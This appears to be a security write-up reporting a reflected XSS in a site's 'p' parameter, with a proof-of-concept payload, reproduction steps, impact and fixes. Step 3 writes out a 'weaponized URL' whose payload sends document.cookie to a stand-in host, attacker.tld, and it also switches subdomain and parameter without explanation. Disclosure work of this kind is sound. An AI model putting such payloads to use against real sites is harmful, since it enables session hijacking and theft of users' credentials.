## Title
Unauthenticated Reflected XSS via `p` Parameter Using `img` tags `onerror` handler Allows Arbitrary JavaScript Execution

## OWASP - Vulnerability
OWASP Top 10 2025 - A05 Injection

## Description
An unauthenticated Reflected Cross-Site Scripting (`XSS`) vulnerability exists in the assets page's `p` parameter. The server reflects user input into the HTTP response without context-aware output encoding, so an `<img>` tag with a broken `src` and `onerror` handler executes arbitrary JavaScript in a victim's browser.

## Vulnerable Endpoint
`https://assets.pwnedbox.site/?p=`

## Payload Used
```
  cybrnoob'"<><img/src=x onerror=alert(1)>
```

## POC / Steps to Reproduce
1. Interact with the search box at `https://assets.pwnedbox.site/?p=` and observe whether the input `cybrnoob'">` is reflected in the source.
   <img width="756" height="491" alt="SCR-20261123-otrn" src="https://github.com/user-attachments/assets/81550357-bd05-4b4e-996b-94889a11c6a6" />
   <img width="756" height="491" alt="SCR-20261123-otob" src="https://github.com/user-attachments/assets/583ae8f1-cda5-45fc-ae70-6671fa3d7b7f" />
2. Inject javascript in the search box to verify if it is executed.
     - Here it can be seen that the injected payload executes seamlessly.
    <img width="756" height="491" alt="SCR-20261123-ovnq" src="https://github.com/user-attachments/assets/bda4ae9f-bf59-48a0-8e7c-2d3c97052985" />
    <img width="756" height="491" alt="SCR-20261123-ovgl" src="https://github.com/user-attachments/assets/581fee5d-d8e6-493b-9386-f5bb14a0fe01" />
3. Craft a weaponized URL (e.g., `https://tutorialrepublic.pwnedbox.site/?q=<img/src=x onerror=fetch('https://attacker.tld/steal?c='+document.cookie)>`) and deliver it to a victim via phishing, malicious link, or social engineering; upon opening the link, the payload executes in the victim's browser origin without any user interaction beyond clicking the link.

## Impact / Risk
1. An attacker can steal session cookies and impersonate the victim.
2. Malicious script can display fake login forms and steal credentials.
3. The script can redirect users, alter page content, or perform actions on their behalf.

## Recommendation
1. Never trust any user input. Treat the p parameter as untrusted.
2. Sanitize the search input and reject or strip HTML special characters such as <, >, ", ', and &.
3. Apply context-aware HTML encoding on output so reflected input is rendered as text and never as executable markup.
4. Use a vetted encoding library and add a restrictive Content Security Policy with HttpOnly and SameSite cookies as defense in depth.
